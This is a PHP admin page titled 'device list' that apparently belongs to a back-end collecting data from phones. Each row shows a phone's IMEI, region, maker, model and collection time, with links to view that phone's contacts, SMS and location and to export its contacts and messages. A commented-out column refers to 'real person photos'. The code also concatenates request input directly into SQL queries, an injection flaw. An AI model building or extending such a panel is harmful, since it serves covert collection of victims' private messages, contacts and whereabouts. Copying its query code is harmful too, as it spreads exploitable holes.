<?php
require_once('common/Db.php');
require_once('common/Function.php');
require_once('common/Session.php');

if(G('p')>0 and (floor(G('p'))- G('p'))== 0){
	$p=G('p');
}
else{
	$p=1;
}
$f=30;//pagenum

$s=($p-1)*$f;

if(strlen(G('u'))>0){
	$w=" and (id='".G('u')."' or imei='".G('u')."')";
}
else{
	$w="";
}

if($_SESSION['adminuser']['qudao']>0){
	$qudao=$_SESSION['adminuser']['qudao'];
	$w=$w." and imei2='".$qudao."'";
	
}
if(isset($_GET['way']) and $_GET['way']=='del'){
	del1();
}

?>
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta name="renderer" content="webkit|ie-comp|ie-stand">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<!--[if lt IE 9]>
<script type="text/javascript" src="lib/html5shiv.js"></script>
<script type="text/javascript" src="lib/respond.min.js"></script>
<![endif]-->
<link rel="stylesheet" type="text/css" href="static/h-ui/css/H-ui.min.css" />
<link rel="stylesheet" type="text/css" href="static/h-ui.admin/css/H-ui.admin.css" />
<link rel="stylesheet" type="text/css" href="lib/Hui-iconfont/1.0.8/iconfont.css" />
<link rel="stylesheet" type="text/css" href="static/h-ui.admin/skin/default/skin.css" id="skin" />
<link rel="stylesheet" type="text/css" href="static/h-ui.admin/css/style.css" />
<!--[if IE 6]>
<script type="text/javascript" src="lib/DD_belatedPNG_0.0.8a-min.js" ></script>
<script>DD_belatedPNG.fix('*');</script>
<![endif]-->
<title>设备列表</title>
</head>
<body>
<nav class="breadcrumb"><a class="btn btn-success radius r" style="line-height:1.6em;margin-top:3px" href="javascript:location.replace(location.href);" title="刷新"><i class="Hui-iconfont"></i></a></nav>
<div class="page-container">



	<div class="mt-20">
		<table class="table table-border table-bordered table-bg table-hover table-sort table-responsive">
			<thead>
				<tr class="text-c">
					
					
					<th >所属手机</th>
					<th >识别码</th>
					<th >归属地区</th>
					<th >厂商</th>
					<th >型号</th>
					<!--th >真人照片</th-->
				
					<th width="140">采集时间</th>
					
					
					<th width="150">操作</th>
				</tr>
			</thead>
			<tbody>
			<?php 
			$a = mysqli_query($GLOBALS['link'],"select * from mac where id>0$w order by id desc limit $s,$f");
			$a2 = mysqli_query($GLOBALS['link'],"select count(id) from mac where id>0$w order by id desc");
			$row2 = mysqli_fetch_array($a2);
			$ps=ceil($row2[0]/$f);
		
	while($row = mysqli_fetch_array($a)){
		
	
			?>
				<tr class="text-c">
					
					
					<td><?php echo $row['imei'];?></td>
					<td><?php echo $row['imei2'];?></td>
					<td><?php echo $row['guishu'];?></td>
					<td><?php echo $row['changshang'];?></td>
					<td><?php echo $row['xinghao'];?></td>
					<!--td><a title="查看" href="javascript:;" onclick="member_edit('查看','tp/tp_<?php echo $row['imei'].$row['imei2'].'.jpg';?>',4,'500','800')" class="ml-5" style="text-decoration:none">查看照片</a></td-->
					<td><?php echo date('Y-m-d-H:i:s',$row['addtime']);?></td>
					
					
					
					
					
					<td class="td-manage">
					
					<?php echo $row['status']==0?'<a title="查看" href="javascript:;" onclick="member_edit(\'查看\',\'alllist.php?i='.$row['imei'].'\',\'4\',\'1300\',\'610\')" class="ml-5" style="text-decoration:none">通讯录</a>
					<a title="查看" href="javascript:;" onclick="member_edit(\'查看\',\'smslist.php?i='.$row['imei'].'&q='.$row['imei2'].'\',\'4\',\'1300\',\'610\')" class="ml-5" style="text-decoration:none">短信</a>
					 <a title="查看" href="javascript:;" onclick="member_edit(\'查看\',\'dingwei.php?i='.$row['imei'].'&q='.$row['imei2'].'\',\'4\',\'500\',\'500\')" class="ml-5" style="text-decoration:none">定位</a>
					<a title="删除" href="javascript:;" onclick="member_del(this,\''.$row['imei'].'\')" class="ml-5" style="text-decoration:none"><font color="#ff0000">删除</font></a>':'';?>
					<a href="daochu.php?type=1&imei=<?php echo $row['imei'];?>&imei2=<?php echo $row['imei2'];?>">导出通讯录</a>
					<a href="daochu.php?type=2&imei=<?php echo $row['imei'];?>&imei2=<?php echo $row['imei2'];?>">导出短信</a>
					
					</td>

				</tr>
				
				
	<?php }
	
	?>
	
	
			</tbody>
		</table>
<?php echo $p<=1 ? '':'<a href="?p='.($p - 1).'"><div class="fy">上一页</div></a>'?>
<div class="fy">当前第<?php echo $p;?>页，共<?php echo $ps;?>页</div>
<?php echo $p>=$ps ? '':'<a href="?p='.($p + 1).'"><div class="fy">下一页</div></a>'?>
	<style>
	.fy{padding:0 20px;height:30px;background:#dbdbdb;line-height:30px;text-align:center;font-size:12px;float:left;margin:10px 10px 0 0;}
</style>	
		
	</div>
</div>
<!--_footer 作为公共模版分离出去-->
<script type="text/javascript" src="lib/jquery/1.9.1/jquery.min.js"></script> 
<script type="text/javascript" src="lib/layer/2.4/layer.js"></script>
<script type="text/javascript" src="static/h-ui/js/H-ui.min.js"></script> 
<script type="text/javascript" src="static/h-ui.admin/js/H-ui.admin.js"></script> <!--/_footer 作为公共模版分离出去-->

<!--请在下方写此页面业务相关的脚本-->
<script type="text/javascript" src="lib/My97DatePicker/4.8/WdatePicker.js"></script> 
<script type="text/javascript" src="lib/datatables/1.10.0/jquery.dataTables.min.js"></script> 
<script type="text/javascript" src="lib/laypage/1.2/laypage.js"></script>
<script type="text/javascript">


/*用户-添加*/
function member_add(title,url,w,h){
	layer_show(title,url,w,h);
}
/*用户-查看*/
function member_show(title,url,id,w,h){
	layer_show(title,url,w,h);
}
/*用户-停用*/
function member_stop(obj,id){
	layer.confirm('确认要休市吗？',function(index){
		$.ajax({
			type: 'POST',
			url: '?way=tingyong',
			data:{
				id:id
			},
			dataType: 'json',
			success: function(data){
				$(obj).parents("tr").find(".td-manage").prepend('<a style="text-decoration:none" onClick="member_start(this,id)" href="javascript:;" title="开市"><i class="Hui-iconfont">&#xe6e1;</i></a>');
				$(obj).parents("tr").find(".td-status").html('<span class="label label-defaunt radius">休市</span>');
				$(obj).remove();
				layer.msg('已休市!',{icon: 5,time:1000});
			},
			error:function(data) {
				console.log(data.msg);
			},
		});		
	});
}

/*用户-启用*/
function member_start(obj,id){
	layer.confirm('确认要开市吗？',function(index){
		$.ajax({
			type: 'POST',
			url: '?way=qiyong',
			data:{
				id:id
			},
			dataType: 'json',
			success: function(data){
				$(obj).parents("tr").find(".td-manage").prepend('<a style="text-decoration:none" onClick="member_stop(this,id)" href="javascript:;" title="休市"><i class="Hui-iconfont">&#xe631;</i></a>');
				$(obj).parents("tr").find(".td-status").html('<span class="label label-success radius">开市</span>');
				$(obj).remove();
				layer.msg('已启用!',{icon: 6,time:1000});
			},
			error:function(data) {
				console.log(data.msg);
			},
		});
	});
}
/*用户-编辑*/
function member_edit(title,url,id,w,h){
	layer_show(title,url,w,h);
}
/*密码-修改*/
function change_password(title,url,id,w,h){
	layer_show(title,url,w,h);	
}
/*用户-删除*/
/*用户-删除*/
function member_del(obj,id){
	alert('演示站点请勿随意删除数据谢谢合作')
	return
	layer.confirm('确认要删除吗？此操作不可逆！请谨慎',function(index){
		
		$.ajax({
			type: 'POST',
			url: '?way=del',
			data:{
				id:id
			},
			dataType: 'json',
			success: function(data){
				
				if(data=='200'){
				$(obj).parents("tr").remove();
				layer.msg('已删除!',{icon:1,time:1000});
				}
			},
			error:function(data) {
				console.log(data.msg);
			},
		});		
	});
}

</script> 
</body>
</html>